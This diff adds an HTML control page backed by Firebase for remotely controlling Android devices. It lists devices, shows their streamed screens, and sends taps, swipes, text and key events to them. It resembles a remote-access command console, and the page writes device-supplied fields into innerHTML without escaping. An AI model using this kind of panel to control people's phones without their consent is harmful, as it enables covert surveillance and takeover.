@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Remote Device Controller</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; }
+        
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        
+        .header {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .device-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .device-card {
+            background: #2d2d2d;
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .device-card:hover { background: #3d3d3d; }
+        .device-card.active { border: 2px solid #4CAF50; }
+        .device-card.online { border-left: 4px solid #4CAF50; }
+        .device-card.offline { border-left: 4px solid #f44336; opacity: 0.6; }
+        
+        .screen-container {
+            background: #2d2d2d;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .screen-header {
+            background: #3d3d3d;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        #deviceScreen {
+            width: 100%;
+            max-height: 600px;
+            object-fit: contain;
+            cursor: crosshair;
+            background: #000;
+        }
+        
+        .controls {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 10px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        
+        .btn-stream { background: #4CAF50; color: white; }
+        .btn-stop { background: #f44336; color: white; }
+        .btn-home { background: #2196F3; color: white; }
+        .btn-back { background: #FF9800; color: white; }
+        .btn-recents { background: #9C27B0; color: white; }
+        
+        button:hover { opacity: 0.8; transform: scale(1.05); }
+        
+        .status { padding: 10px; background: #333; border-radius: 5px; margin: 10px 0; }
+        
+        .touch-controls {
+            margin-top: 20px;
+            padding: 20px;
+            background: #2d2d2d;
+            border-radius: 10px;
+        }
+        
+        .gesture-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        
+        input[type="text"] {
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #555;
+            background: #333;
+            color: white;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 Device Remote Controller</h1>
+            <div>
+                <span id="connectionStatus">🟡 Connecting...</span>
+            </div>
+        </div>
+        
+        <!-- Device Selection -->
+        <div id="deviceList" class="device-list"></div>
+        
+        <!-- Screen Display -->
+        <div class="screen-container" id="screenContainer" style="display:none;">
+            <div class="screen-header">
+                <h3>Device Screen - <span id="selectedDevice">None</span></h3>
+                <div>
+                    <button class="btn-stream" onclick="startStreaming()">▶ Start Stream</button>
+                    <button class="btn-stop" onclick="stopStreaming()">⏹ Stop Stream</button>
+                </div>
+            </div>
+            <img id="deviceScreen" alt="Device Screen" />
+        </div>
+        
+        <!-- Control Buttons -->
+        <div class="controls" id="controls" style="display:none;">
+            <button class="btn-home" onclick="sendKeyEvent(3)">🏠 Home</button>
+            <button class="btn-back" onclick="sendKeyEvent(4)">⬅ Back</button>
+            <button class="btn-recents" onclick="sendKeyEvent(187)">📋 Recents</button>
+            <button class="btn-stream" onclick="sendKeyEvent(24)">🔊 Vol Up</button>
+            <button class="btn-stop" onclick="sendKeyEvent(25)">🔉 Vol Down</button>
+        </div>
+        
+        <!-- Touch Controls -->
+        <div class="touch-controls" id="touchControls" style="display:none;">
+            <h3>🖱 Touch Controls</h3>
+            <p>Click or drag on screen to interact</p>
+            <div class="gesture-buttons">
+                <button onclick="setGestureMode('tap')">👆 Tap</button>
+                <button onclick="setGestureMode('swipe')">👈 Swipe</button>
+                <button onclick="setGestureMode('longpress')">⏱ Long Press</button>
+            </div>
+            <input type="text" id="textInput" placeholder="Type text to send..." 
+                   onkeypress="if(event.key==='Enter') sendText()">
+            <button onclick="sendText()">📝 Send Text</button>
+        </div>
+        
+        <div id="statusLog" class="status"></div>
+    </div>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDMddaD1sSCjzdT0cYlvcSPl8V-vADWLrw",
+            authDomain: "newprooject-c6f66.firebaseapp.com",
+            databaseURL: "https://newprooject-c6f66-default-rtdb.firebaseio.com",
+            projectId: "newprooject-c6f66",
+            storageBucket: "newprooject-c6f66.appspot.com",
+            messagingSenderId: "733557611631",
+            appId: "1:733557611631:web:3cab8af8fa93b1783b019a"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Global variables
+        let selectedDeviceId = null;
+        let gestureMode = 'tap';
+        let isStreaming = false;
+        let screenScaleX = 1;
+        let screenScaleY = 1;
+        
+        // Connection status
+        database.ref('.info/connected').on('value', (snap) => {
+            if (snap.val() === true) {
+                document.getElementById('connectionStatus').innerHTML = '🟢 Connected';
+            } else {
+                document.getElementById('connectionStatus').innerHTML = '🔴 Disconnected';
+            }
+        });
+        
+        // Load device list
+        function loadDevices() {
+            database.ref('devices').on('value', (snapshot) => {
+                const deviceList = document.getElementById('deviceList');
+                deviceList.innerHTML = '';
+                
+                snapshot.forEach((childSnapshot) => {
+                    const device = childSnapshot.val();
+                    const deviceId = childSnapshot.key;
+                    const isOnline = (Date.now() - device.lastSeen) < 60000; // Online if seen in last 60 seconds
+                    
+                    const card = document.createElement('div');
+                    card.className = `device-card ${isOnline ? 'online' : 'offline'} ${deviceId === selectedDeviceId ? 'active' : ''}`;
+                    card.onclick = () => selectDevice(deviceId);
+                    
+                    card.innerHTML = `
+                        <h3>📱 ${device.deviceName || 'Unknown'}</h3>
+                        <p>Android ${device.androidVersion || 'N/A'}</p>
+                        <p>Screen: ${device.screenWidth || '?'}x${device.screenHeight || '?'}</p>
+                        <p>Status: ${isOnline ? '🟢 Online' : '🔴 Offline'}</p>
+                        <p>Streaming: ${device.streaming_status || 'inactive'}</p>
+                        <p>Last seen: ${new Date(device.lastSeen).toLocaleTimeString()}</p>
+                    `;
+                    
+                    deviceList.appendChild(card);
+                });
+            });
+        }
+        
+        // Select device to control
+        function selectDevice(deviceId) {
+            selectedDeviceId = deviceId;
+            document.getElementById('selectedDevice').textContent = deviceId;
+            document.getElementById('screenContainer').style.display = 'block';
+            document.getElementById('controls').style.display = 'block';
+            document.getElementById('touchControls').style.display = 'block';
+            
+            // Start listening to screen updates
+            listenToScreen(deviceId);
+            
+            logStatus('Selected device: ' + deviceId);
+        }
+        
+        // Listen for screen updates
+        function listenToScreen(deviceId) {
+            database.ref('devices/' + deviceId + '/screen').on('value', (snapshot) => {
+                const screenData = snapshot.val();
+                if (screenData && screenData.image) {
+                    const screenImg = document.getElementById('deviceScreen');
+                    screenImg.src = 'data:image/jpeg;base64,' + screenData.image;
+                    
+                    // Update scale factors for touch coordinates
+                    if (screenData.width && screenData.height) {
+                        screenScaleX = screenData.width / screenImg.clientWidth;
+                        screenScaleY = screenData.height / screenImg.clientHeight;
+                    }
+                }
+            });
+        }
+        
+        // Send command to device
+        function sendCommand(commandData) {
+            if (!selectedDeviceId) {
+                alert('Please select a device first');
+                return;
+            }
+            
+            const commandRef = database.ref('devices/' + selectedDeviceId + '/commands').push();
+            commandRef.set(commandData)
+                .then(() => logStatus('Command sent: ' + JSON.stringify(commandData)))
+                .catch((error) => logStatus('Error: ' + error));
+        }
+        
+        // Start/Stop streaming
+        function startStreaming() {
+            sendCommand({ type: 'start_streaming' });
+            isStreaming = true;
+            logStatus('Started streaming');
+        }
+        
+        function stopStreaming() {
+            sendCommand({ type: 'stop_streaming' });
+            isStreaming = false;
+            logStatus('Stopped streaming');
+        }
+        
+        // Touch/Swipe on screen
+        document.addEventListener('DOMContentLoaded', () => {
+            const screen = document.getElementById('deviceScreen');
+            let startX, startY, isTouching = false;
+            
+            screen.addEventListener('mousedown', (e) => {
+                const rect = screen.getBoundingClientRect();
+                startX = (e.clientX - rect.left) * screenScaleX;
+                startY = (e.clientY - rect.top) * screenScaleY;
+                isTouching = true;
+                
+                if (gestureMode === 'tap') {
+                    sendCommand({
+                        type: 'touch',
+                        x: Math.round(startX),
+                        y: Math.round(startY)
+                    });
+                }
+            });
+            
+            screen.addEventListener('mousemove', (e) => {
+                if (!isTouching && gestureMode !== 'swipe') return;
+                
+                const rect = screen.getBoundingClientRect();
+                const currentX = (e.clientX - rect.left) * screenScaleX;
+                const currentY = (e.clientY - rect.top) * screenScaleY;
+                
+                if (gestureMode === 'swipe') {
+                    sendCommand({
+                        type: 'swipe',
+                        startX: Math.round(startX),
+                        startY: Math.round(startY),
+                        endX: Math.round(currentX),
+                        endY: Math.round(currentY)
+                    });
+                }
+            });
+            
+            screen.addEventListener('mouseup', (e) => {
+                const rect = screen.getBoundingClientRect();
+                const endX = (e.clientX - rect.left) * screenScaleX;
+                const endY = (e.clientY - rect.top) * screenScaleY;
+                
+                if (gestureMode === 'longpress') {
+                    sendCommand({
+                        type: 'long_press',
+                        x: Math.round(endX),
+                        y: Math.round(endY)
+                    });
+                }
+                
+                isTouching = false;
+            });
+            
+            // Touch events for mobile
+            screen.addEventListener('touchstart', (e) => {
+                e.preventDefault();
+                const touch = e.touches[0];
+                const rect = screen.getBoundingClientRect();
+                startX = (touch.clientX - rect.left) * screenScaleX;
+                startY = (touch.clientY - rect.top) * screenScaleY;
+                
+                sendCommand({
+                    type: 'touch',
+                    x: Math.round(startX),
+                    y: Math.round(startY)
+                });
+            });
+            
+            screen.addEventListener('touchmove', (e) => {
+                e.preventDefault();
+                const touch = e.touches[0];
+                const rect = screen.getBoundingClientRect();
+                const currentX = (touch.clientX - rect.left) * screenScaleX;
+                const currentY = (touch.clientY - rect.top) * screenScaleY;
+                
+                sendCommand({
+                    type: 'swipe',
+                    startX: Math.round(startX),
+                    startY: Math.round(startY),
+                    endX: Math.round(currentX),
+                    endY: Math.round(currentY)
+                });
+            });
+        });
+        
+        // Set gesture mode
+        function setGestureMode(mode) {
+            gestureMode = mode;
+            logStatus('Gesture mode: ' + mode);
+        }
+        
+        // Send keyboard text
+        function sendText() {
+            const text = document.getElementById('textInput').value;
+            if (text) {
+                sendCommand({
+                    type: 'text_input',
+                    text: text
+                });
+                document.getElementById('textInput').value = '';
+                logStatus('Text sent: ' + text);
+            }
+        }
+        
+        // Send key events
+        function sendKeyEvent(keyCode) {
+            sendCommand({
+                type: 'key_event',
+                keyCode: keyCode
+            });
+            logStatus('Key event sent: ' + keyCode);
+        }
+        
+        // Status logging
+        function logStatus(message) {
+            const log = document.getElementById('statusLog');
+            log.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}<br>` + log.innerHTML;
+        }
+        
+        // Initialize
+        loadDevices();
+        logStatus('System initialized');
+    </script>
+</body>
+</html>
